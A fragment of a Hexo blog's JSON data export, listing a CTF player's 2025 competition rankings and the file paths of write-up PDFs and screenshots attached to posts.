align=\"center\">比赛情况</th>\n<th align=\"center\">比赛成绩</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">MoeCTF2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#2 17900pts</td>\n</tr>\n<tr>\n<td align=\"center\">CBCTF2025</td>\n<td align=\"center\">写了几天，完赛</td>\n<td align=\"center\">#18 7,739.86pts</td>\n</tr>\n<tr>\n<td align=\"center\">Newstar2025</td>\n<td align=\"center\">中途咕咕咕，完赛</td>\n<td align=\"center\">#80 2247pts</td>\n</tr>\n<tr>\n<td align=\"center\">SUSCTF2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#34 772pts</td>\n</tr>\n<tr>\n<td align=\"center\">0xGame2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#4 25350pts</td>\n</tr>\n<tr>\n<td align=\"center\">TSCTF-J2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#6 10351pts</td>\n</tr>\n<tr>\n<td align=\"center\">GeekGame2025</td>\n<td align=\"center\">完赛</td>\n<td align=\"center\">#174 663pts</td>\n</tr>\n</tbody></table>\n"}],"PostAsset":[{"_id":"source/_posts/GeekChallenge-WP/BUP7-Pi-圆周率WP.pdf","slug":"BUP7-Pi-圆周率WP.pdf","post":"cmk9p9p3p0001h4vb1af38tur","modified":0,"renderable":0},{"_id":"source/_posts/0xGame2025-WP-PDF/非校内新生_Week1_圆周率_wp.pdf","slug":"非校内新生_Week1_圆周率_wp.pdf","post":"cmk9p9p3s0005h4vb2cuj1kig","modified":0,"renderable":0},{"_id":"source/_posts/0xGame2025-WP-PDF/非校内新生_Week2_圆周率_wp.pdf","slug":"非校内新生_Week2_圆周率_wp.pdf","post":"cmk9p9p3s0005h4vb2cuj1kig","modified":0,"renderable":0},{"_id":"source/_posts/0xGame2025-WP-PDF/非校内新生_Week3_圆周率_wp.pdf","slug":"非校内新生_Week3_圆周率_wp.pdf","post":"cmk9p9p3s0005h4vb2cuj1kig","modified":0,"renderable":0},{"_id":"source/_posts/0xGame2025-WP-PDF/非校内新生_Week4_圆周率_wp.pdf","slug":"非校内新生_Week4_圆周率_wp.pdf","post":"cmk9p9p3s0005h4vb2cuj1kig","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image-1.png","slug":"image-1.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image-2.png","slug":"image-2.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image-3.png","slug":"image-3.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image-4.png","slug":"image-4.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image-5.png","slug":"image-5.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image-6.png","slug":"image-6.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image-7.png","slug":"image-7.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image-8.png","slug":"image-8.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-复盘/image.png","slug":"image.png","post":"cmk9p9p3r0003h4vb7pltc7ug","modified":0,"renderable":0},{"_id":"source/_posts/NewStar2025-WP-PDF/圆周率WP-Week1.pdf","slug":"圆周率WP-Week1.pdf","post":"cmk9p9p3s0004h4vbbq42g3wd","modified":0,"renderable":0},{"_id":"source/_posts/NewStar2025-WP-PDF/圆周率WP-Week2.pdf","slug":"圆周率WP-Week2.pdf","post":"cmk9p9p3s0004h4vbbq42g3wd","modified":0,"renderable":0},{"_id":"source/_posts/NewStar2025-WP-PDF/圆周率WP-Week3.pdf","slug":"圆周率WP-Week3.pdf","post":"cmk9p9p3s0004h4vbbq42g3wd","modified":0,"renderable":0},{"_id":"source/_posts/NewStar2025-WP-PDF/圆周率WP-Week4.pdf","slug":"圆周率WP-Week4.pdf","post":"cmk9p9p3s0004h4vbbq42g3wd","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-1.png","slug":"image-1.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-10.png","slug":"image-10.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-11.png","slug":"image-11.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-12.png","slug":"image-12.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-13.png","slug":"image-13.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-14.png","slug":"image-14.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-15.png","slug":"image-15.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-16.png","slug":"image-16.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-17.png","slug":"image-17.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-18.png","slug":"image-18.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-19.png","slug":"image-19.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-2.png","slug":"image-2.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-20.png","slug":"image-20.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-21.png","slug":"image-21.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-22.png","slug":"image-22.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-23.png","slug":"image-23.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-24.png","slug":"image-24.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-25.png","slug":"image-25.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-26.png","slug":"image-26.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-27.png","slug":"image-27.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-28.png","slug":"image-28.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-29.png","slug":"image-29.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-3.png","slug":"image-3.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-30.png","slug":"image-30.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-31.png","slug":"image-31.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-32.png","slug":"image-32.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-33.png","slug":"image-33.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-34.png","slug":"image-34.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-35.png","slug":"image-35.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-36.png","slug":"image-36.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-37.png","slug":"image-37.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-38.png","slug":"image-38.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-39.png","slug":"image-39.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-4.png","slug":"image-4.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-40.png","slug":"image-40.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-41.png","slug":"image-41.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-42.png","slug":"image-42.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-43.png","slug":"image-43.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-44.png","slug":"image-44.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-45.png","slug":"image-45.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-46.png","slug":"image-46.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-47.png","slug":"image-47.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-48.png","slug":"image-48.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-49.png","slug":"image-49.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-5.png","slug":"image-5.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-50.png","slug":"image-50.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-51.png","slug":"image-51.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-52.png","slug":"image-52.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-53.png","slug":"image-53.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-54.png","slug":"image-54.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-55.png","slug":"image-55.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-56.png","slug":"image-56.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-57.png","slug":"image-57.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-58.png","slug":"image-58.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-59.png","slug":"image-59.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-6.png","slug":"image-6.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-60.png","slug":"image-60.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-61.png","slug":"image-61.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-62.png","slug":"image-62.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-63.png","slug":"image-63.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-64.png","slug":"image-64.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-65.png","slug":"image-65.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-7.png","slug":"image-7.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-8.png","slug":"image-8.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image-9.png","slug":"image-9.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/image.png","slug":"image.png","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/TSCTF-J2025-WP/圆周率WP.pdf","slug":"圆周率WP.pdf","post":"cmk9p9p3t0006h4vbebjn0kfn","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/GIF 2025-11-4 20-49-48.gif","slug":"GIF 2025-11-4 20-49-48.gif","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/GIF 2025-11-4 20-50-19.gif","slug":"GIF 2025-11-4 20-50-19.gif","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/image-1.png","slug":"image-1.png","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/image-2.png","slug":"image-2.png","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/image-3.png","slug":"image-3.png","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/image-4.png","slug":"image-4.png","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/image-5.png","slug":"image-5.png","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/image.png","slug":"image.png","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0},{"_id":"source/_posts/小站修补琐记/image0.png","slug":"image0.png","post":"cmk9p9p3t0007h4vbbfq99hxi","modified":0,"renderable":0}],"PostCategory":[],"PostTag":[],"Tag":[]}}